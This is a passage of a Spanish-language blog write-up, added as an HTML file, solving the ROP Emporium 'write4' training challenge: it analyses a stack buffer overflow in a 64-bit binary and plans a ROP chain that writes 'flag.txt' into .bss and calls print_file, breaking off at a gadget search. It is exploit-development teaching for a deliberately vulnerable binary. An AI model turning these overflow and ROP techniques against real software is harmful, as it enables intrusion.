@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="content-language" content="en-us" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+  
+  
+  <title>write4 - ROP Emporium &middot; </title>
+  <meta name="title" content="write4 - ROP Emporium &middot; " />
+  
+
+  
+  
+  <meta name="description" content="64-bit binary. ROP. Overwriting of .bss. Buffer Overflow." />
+  
+  <meta name="keywords" content="pwn, " />
+  <link rel="canonical" href="https://your_domain.com/writeups/write4-ropemporium/" />
+
+  
+
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e77fb9de95173d1662ee38560277a03d18b19cab04c81086586420c424233164ce4a4a45d7b8080086f14bee2808cdec521b6499d98183e29d7bd90d5c832c88.css" integrity="sha512-53&#43;53pUXPRZi7jhWAnegPRixnKsEyBCGWGQgxCQjMWTOSkpF17gIAIbxS&#43;4oCM3sUhtkmdmBg&#43;Kde9kNXIMsiA==" />
+
+
+  
+
+
+  
+
+
+
+  
+
+
+
+  
+    
+        
+        <script defer type="text/javascript" src="/js/theme.min.b12ffe233a345d2a545ca355b5aa71c906bbebbee2ea801f46de9e7af2b59da08cc4ffe002b2f302ce00f00eddca05abd8f71c16335f949d96e42eb5971c0235.js" integrity="sha512-sS/&#43;Izo0XSpUXKNVtapxyQa7677i6oAfRt6eevK1naCMxP/gArLzAs4A8A7dygWr2PccFjNflJ2W5C61lxwCNQ=="> </script>
+      
+    
+  
+
+  
+    
+        
+        <script defer type="text/javascript" src="/js/codecopy.min.6319d0ad3eae498a0591b4ec1d52cc0156f5c3cb95390089d7d0ac7fe6dfb183161c14f935d25b5ad896840e2a9d6a23f555a7976954d0a263c24a11272aa747.js" integrity="sha512-YxnQrT6uSYoFkbTsHVLMAVb1w8uVOQCJ19Csf&#43;bfsYMWHBT5NdJbWtiWhA4qnWoj9VWnl2lU0KJjwkoRJyqnRw=="> </script>
+      
+    
+  
+
+  
+    
+        
+        <script defer type="text/javascript" src="/js/search.min.bb866b924569dd33a507ff4631eae853f6b6902fe0dbfe5e8aad50e1ccd528db3a01aaf098948dd4516d6bbd2dab8c6716b4b31809eb28ad8ce47d4801a0f0c3.js" integrity="sha512-u4ZrkkVp3TOlB/9GMeroU/a2kC/g2/5eiq1Q4czVKNs6AarwmJSN1FFta70tq4xnFrSzGAnrKK2M5H1IAaDwww=="> </script>
+      
+    
+  
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+
+  <meta property="og:url" content="https://your_domain.com/writeups/write4-ropemporium/">
+  <meta property="og:title" content="write4 - ROP Emporium">
+  <meta property="og:description" content="64-bit binary. ROP. Overwriting of .bss. Buffer Overflow.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2025-03-11T22:12:36-03:00">
+    <meta property="article:modified_time" content="2025-03-11T22:12:36-03:00">
+    <meta property="article:tag" content="Pwn">
+
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="write4 - ROP Emporium">
+  <meta name="twitter:description" content="64-bit binary. ROP. Overwriting of .bss. Buffer Overflow.">
+
+  
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script
+      defer
+      type="text/javascript"
+      src="/lib/fuse/fuse.min.1ab2783fdcab6ba75fb69e4ed1e68a14a4b8721d45627d7147f5421d020c24ed4b36a70a8639009001131d8a04f3515f87706308931603f0194983f9db58f114.js"
+      integrity="sha512-GrJ4P9yra6dftp5O0eaKFKS4ch1FYn1xR/VCHQIMJO1LNqcKhjkAkAETHYoE81Ffh3BjCJMWA/AZSYP521jxFA=="
+    ></script>
+  
+
+
+
+  
+  
+  
+
+  
+  
+
+
+
+  
+  
+  
+  
+  
+
+  
+  
+  
+    <link rel="preload" href="https://your_domain.com/fonts/Ubuntu-Regular.woff2" as="font" type="font/woff2" crossorigin>
+  
+
+  
+
+  
+
+</head>
+
+  <body>
+    <script>
+      const siteTheme = "dark";
+      let savedTheme = localStorage.getItem('theme') || siteTheme;
+      if (savedTheme == 'auto') {
+        if ( window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ) {
+          savedTheme = 'dark';
+        }
+      }
+      if (savedTheme === "dark") {
+        document.body.classList.add('dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    </script>
+    <div class="content">
+      <header>
+    
+    <div class="header-cntr">
+    <a class="title" href="/">
+    <span></span>
+    </a>
+  <div class="menu">
+  <nav id="main-menu" class="mm-normal">
+    <ul>
+    <li> <button id="mob-x-icon" class="menu-btn" arial-label="x-icon"> 
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+ </button> </li>
+    
+      <li><a href="/" aria-label="home">
+      home</li></a>
+    
+      <li><a href="/writeups/" aria-label="writeups">
+      writeups</li></a>
+    
+      <li><a href="/friends-blogs/" aria-label="friends blogs">
+      friends blogs</li></a>
+    
+    </ul>
+  </nav>
+    <div class="side-menu">
+    
+<button id="search-open" class="menu-btn" aria-label="Search button">
+  
+
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+
+
+</button>
+
+<div id="search-container" data-url="https://your_domain.com/">
+  <div class="search">
+    <div class="panel">
+      <form>
+        
+
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+
+
+        <input type="search" id="search-query" placeholder="Search" tabindex=0 autocomplete="off"/>
+        <button id="search-close" title="Cancel (ESC)">
+          
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+
+
+        </button>
+      </form>
+    </div>
+    <ul id="search-results">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+    </ul>
+  </div>
+</div>
+
+    
+    </div>
+    <button id="mob-hb-icon" class="menu-btn" aria-label="Hamburger icon">
+      
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+
+
+    </button>
+  </div>
+  <script>
+  (function() {
+    document.addEventListener('DOMContentLoaded', function() {
+    const openBtn = document.getElementById('mob-hb-icon');
+    const closeBtn = document.getElementById('mob-x-icon');
+    const mainMenu = document.getElementById('main-menu');
+    const body = document.body;
+
+    openBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-normal', 'mm-mobile-open');
+        closeBtn.style.display = 'block';
+        body.style.overflow = 'hidden';
+    });
+    closeBtn.addEventListener('click', function() {
+        mainMenu.classList.replace('mm-mobile-open', 'mm-normal');
+        closeBtn.style.display = 'none';
+        body.style.overflow = '';
+    });
+    })
+  })();
+  </script>
+  
+  <script>
+  (function() {
+    var mainmenu = document.getElementById('main-menu');
+    if (!mainmenu) return;
+
+    var path = window.location.pathname;
+    var links = mainmenu.querySelectorAll('a');
+
+    links.forEach(function(link) {
+      if (link.getAttribute('href') === path) {
+        link.classList.add('active');
+      }
+    });
+  })();
+  </script>
+  
+</div>
+</header>
+
+      <main>
+        
+
+
+
+
+
+
+
+<h1 class="pg-title">write4 - ROP Emporium</h1>
+
+
+<div class="meta">
+  
+
+
+
+
+<div class="meta-container">
+  <p>
+    
+    
+      
+      
+      <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="currentColor" width="800px" height="800px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19,4H17V3a1,1,0,0,0-2,0V4H9V3A1,1,0,0,0,7,3V4H5A3,3,0,0,0,2,7V19a3,3,0,0,0,3,3H19a3,3,0,0,0,3-3V7A3,3,0,0,0,19,4Zm1,15a1,1,0,0,1-1,1H5a1,1,0,0,1-1-1V12H20Zm0-9H4V7A1,1,0,0,1,5,6H7V7A1,1,0,0,0,9,7V6h6V7a1,1,0,0,0,2,0V6h2a1,1,0,0,1,1,1Z"/></svg>
+
+
+</span>
+      Posted on <time datetime="2025-03-11T22:12:36-03:00">Mar 11, 2025</time>
+      
+      
+      
+    
+    
+      <span class="meta-icon">
+
+    <?xml version="1.0" encoding="utf-8"?><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+<path d="M23 12C23 18.0751 18.0751 23 12 23C5.92487 23 1 18.0751 1 12C1 5.92487 5.92487 1 12 1C18.0751 1 23 5.92487 23 12ZM3.00683 12C3.00683 16.9668 7.03321 20.9932 12 20.9932C16.9668 20.9932 20.9932 16.9668 20.9932 12C20.9932 7.03321 16.9668 3.00683 12 3.00683C7.03321 3.00683 3.00683 7.03321 3.00683 12Z" fill="currentColor"/>
+<path d="M12 5C11.4477 5 11 5.44771 11 6V12.4667C11 12.4667 11 12.7274 11.1267 12.9235C11.2115 13.0898 11.3437 13.2343 11.5174 13.3346L16.1372 16.0019C16.6155 16.278 17.2271 16.1141 17.5032 15.6358C17.7793 15.1575 17.6155 14.5459 17.1372 14.2698L13 11.8812V6C13 5.44772 12.5523 5 12 5Z" fill="currentColor"/>
+</svg>
+
+
+</span>
+      
+        9 mins
+      
+    
+    
+  </p>
+  
+</div>
+
+  
+
+
+<p>
+  <span class="meta-icon"> 
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M48 32H197.5C214.5 32 230.7 38.74 242.7 50.75L418.7 226.7C443.7 251.7 443.7 292.3 418.7 317.3L285.3 450.7C260.3 475.7 219.7 475.7 194.7 450.7L18.75 274.7C6.743 262.7 0 246.5 0 229.5V80C0 53.49 21.49 32 48 32L48 32zM112 176C129.7 176 144 161.7 144 144C144 126.3 129.7 112 112 112C94.33 112 80 126.3 80 144C80 161.7 94.33 176 112 176z"/></svg>
+
+
+ </span>
+  
+  <a class="tag" href="/tags/pwn/">Pwn</a>
+  
+</p>
+
+
+
+</div>
+
+
+
+
+  <div class="toc">
+    <details >
+      <summary accesskey="c" title="(Alt+C)">
+        Table of Contents
+      </summary>
+      <div class="toc-innr">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ingenieria-inversa">Ingenieria inversa</a></li>
+    <li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li>
+    <li><a href="#explotación">Explotación</a></li>
+    <li><a href="#exploit-final">Exploit final.</a></li>
+  </ul>
+</nav>
+      </div>
+    </details>
+  </div>
+  
+
+
+
+<p>Se nos proporciona un binario de 64 bits con las siguientes protecciones.</p>
+<pre><font color="#CC0000"><b>$</b></font> checksec write4
+    Arch:       amd64-64-little
+    RELRO:      <font color="#C4A000">Partial RELRO</font>
+    Stack:      <font color="#CC0000">No canary found</font>
+    NX:         <font color="#4E9A06">NX enabled</font>
+    PIE:        <font color="#CC0000">No PIE (0x400000)</font>
+    RUNPATH:    <font color="#CC0000">b&apos;.&apos;</font>
+    Stripped:   <font color="#CC0000">No</font></pre>
+<p>Tambien nos entregan su libreria compartida, esta contiene todas las funciones utilizadas por el binario.</p>
+<pre><font color="#CC0000"><b>$</b></font> ldd write4
+        linux-vdso.so.1 (0x00007a1412b02000)
+        libwrite4.so =&gt; ./libwrite4.so (0x00007a1412800000)
+        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007a1412400000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007a1412b04000)
+<font color="#CC0000"><b>$</b></font> file libwrite4.so 
+libwrite4.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=6480d05c301d646a5677805e7226e81b35c23f7d, not stripped</pre>
+<p>Al ejecutar el binario, este solicita un valor de entrada. Si ingresamos cualquier cadena y presionamos Enter, el programa finaliza su ejecución sin mayor interacción.</p>
+<pre><font color="#CC0000"><b>$</b></font> ./write4 
+write4 by ROP Emporium
+x86_64
+
+Go ahead and give me the input already!
+
+&gt; test
+Thank you!</pre>
+
+<h2 id="ingenieria-inversa">
+  Ingenieria inversa
+  
+  <a hidden class="anchor" href="#ingenieria-inversa">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>Abrimos el binario con gdb y al revisar sus funciones vemos lo siguiente.</p>
+<pre><font color="#CC0000"><b>gef➤  </b></font>info functions
+All defined functions:
+
+Non-debugging symbols:
+<font color="#3465A4">0x00000000004004d0</font>  <font color="#C4A000">_init</font>
+<font color="#3465A4">0x0000000000400500</font>  <font color="#C4A000">pwnme@plt</font>
+<font color="#3465A4">0x0000000000400510</font>  <font color="#C4A000">print_file@plt</font>
+<font color="#3465A4">0x0000000000400520</font>  <font color="#C4A000">_start</font>
+<font color="#3465A4">0x0000000000400550</font>  <font color="#C4A000">_dl_relocate_static_pie</font>
+<font color="#3465A4">0x0000000000400560</font>  <font color="#C4A000">deregister_tm_clones</font>
+<font color="#3465A4">0x0000000000400590</font>  <font color="#C4A000">register_tm_clones</font>
+<font color="#3465A4">0x00000000004005d0</font>  <font color="#C4A000">__do_global_dtors_aux</font>
+<font color="#3465A4">0x0000000000400600</font>  <font color="#C4A000">frame_dummy</font>
+<font color="#3465A4">0x0000000000400607</font>  <font color="#C4A000">main</font>
+<font color="#3465A4">0x0000000000400617</font>  <font color="#C4A000">usefulFunction</font>
+<font color="#3465A4">0x0000000000400628</font>  <font color="#C4A000">usefulGadgets</font>
+<font color="#3465A4">0x0000000000400630</font>  <font color="#C4A000">__libc_csu_init</font>
+<font color="#3465A4">0x00000000004006a0</font>  <font color="#C4A000">__libc_csu_fini</font>
+<font color="#3465A4">0x00000000004006a4</font>  <font color="#C4A000">_fini</font></pre>
+<p>Observamos que las funciones pwnme y print_file se encuentran referenciadas en la PLT. Esto indica que ambas están implementadas en una biblioteca compartida y no en el propio binario. Abriremos esta biblioteca utilizando IDA para examinar su implementación, revisaremos la funcion <code>pwnme</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pwnme</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _BYTE s[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;write4 by ROP Emporium&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;x86_64</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(s, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(s));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Go ahead and give me the input already!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, s, <span style="color:#ae81ff">0x200uLL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Thank you!&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Define un buffer de 32 bytes (_BYTE s[32]), imprime dos mensajes mediante puts() y utiliza la función read() para leer nuestro input hasta 512 bytes (0x200). Esta discrepancia entre el tamaño del buffer y la cantidad de datos que read() puede recibir genera una vulnerabilidad de Buffer Overflow, ya que si ingresamos mas de 32 bytes se sobrescribirá la pila, incluyendo potencialmente la dirección de retorno, permitiendo así el control del flujo de ejecución. La otra funcion interesante que tiene el binario es <code>print_file</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_file</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  FILE <span style="color:#f92672">*</span>stream; <span style="color:#75715e">// [rsp+38h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  stream <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(a1, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>stream )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Failed to open file: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(s, <span style="color:#ae81ff">33</span>, stream);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(s);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fclose</span>(stream);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>La función print_file() abre el archivo cuyo nombre se le pase como argumento. Si el archivo no existe, imprime un mensaje de error y finaliza la ejecución con exit(1). En caso contrario, lee hasta 33 bytes del archivo mediante fgets() y los imprime con puts(). Esta función es clave para la explotación, ya que permite controlar qué archivo se abre, facilitando la lectura de archivos sensibles si se manipula adecuadamente.</p>
+
+<h2 id="estrategia-de-explotación">
+  Estrategia de explotación
+  
+  <a hidden class="anchor" href="#estrategia-de-explotaci%c3%b3n">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>Para resolver este desafío, debemos explotar el Buffer Overflow y redirigir el flujo de ejecución hacia la función print_file() para abrir el archivo flag.txt. Sin embargo, no hay una cadena flag.txt en la sección .rodata ni en ninguna otra parte del binario que podamos utilizar directamente como argumento.</p>
+<pre><font color="#CC0000"><b>$</b></font> rabin2 -z write4
+[Strings]
+nth paddr      vaddr      len size section type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent</pre>
+<p>Dado que no contamos con la cadena flag.txt en el binario (como en los desafios mas faciles de ROP Emporium), será necesario escribirla manualmente en una región de memoria controlable, como la sección .bss, y luego pasar su dirección como argumento a print_file(). Pero antes de hacer esto, ya que estamos, me gustaria explicar algunos conceptos.</p>
+<p>Al compilar un binario en Linux, este se transforma en un Executable and Linkable Format (ELF), el formato estándar para archivos ejecutables en sistemas UNIX. Este formato organiza el binario en distintas secciones de memoria, cada una con un propósito específico.</p>
+<img src="/images/elfctm.png">
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+  
+    
+  
+
+  
+
+
+
+
+</p>
+<p>Entre estas secciones, algunas permiten escritura, como la .bss. Esta sección es utilizada para almacenar variables no inicializadas en tiempo de compilación y se encuentra vacía (solo ocupando espacio lógico) hasta que el programa se ejecuta. Su principal ventaja es que cuenta con permisos de lectura/escritura (rw), lo que la convierte en un excelente objetivo para inyectar datos controlados durante la explotación. Verifcamos esto con <code>readelf</code>.</p>
+<pre><font color="#CC0000"><b>$</b></font> readelf -S write4 | grep bss -B 1
+       0000000000000010  0000000000000000  WA       0     0     8
+  [24] .<font color="#CC0000"><b>bss</b></font>              NOBITS           0000000000601038  00001038</pre>
+<p>La estrategia consiste en explotar el Buffer Overflow para redirigir el flujo de ejecución, utilizar gadgets (obtenidos con ropper) que permitan escribir la cadena flag.txt en la .bss, y finalmente invocar la función print_file() pasándole como argumento la dirección de la .bss para que lea y muestre el contenido del archivo. Esta técnica aprovecha la capacidad de manipular regiones de memoria controlables junto con el uso preciso de gadgets ROP para lograr la ejecución controlada del flujo del programa.</p>
+
+<h2 id="explotación">
+  Explotación
+  
+  <a hidden class="anchor" href="#explotaci%c3%b3n">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>Para comenzar, necesitamos un gadget que permita extraer dos valores de la pila y cargarlos en registros, lo que facilitará la manipulación de direcciones y datos. Utilizando ropper y filtrando por pop, encontramos el gadget pop r14; pop r15; ret;, que se ajusta perfectamente a nuestros objetivos.</p>
+<pre><font color="#CC0000"><b>$</b></font> ropper --file write4 --search &apos;pop&apos;
+<font color="#4E9A06">[INFO]</font> Load gadgets from cache
+<font color="#4E9A06">[LOAD]</font> loading... <font color="#D3D7CF">100%</font>
+<font color="#4E9A06">[LOAD]</font> removing double gadgets... <font color="#D3D7CF">100%</font>
+<font color="#4E9A06">[INFO]</font> <font color="#D3D7CF">Searching for gadgets: pop</font>
+
+<font color="#4E9A06">[INFO]</font> <font color="#D3D7CF">File: write4</font>
